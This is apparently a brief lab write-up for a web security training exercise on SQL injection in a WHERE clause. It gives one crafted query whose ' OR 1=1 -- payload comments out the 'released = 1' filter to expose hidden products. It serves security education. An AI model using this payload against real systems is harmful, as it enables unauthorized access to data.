# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Craft the SQL query in this format 

    SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1
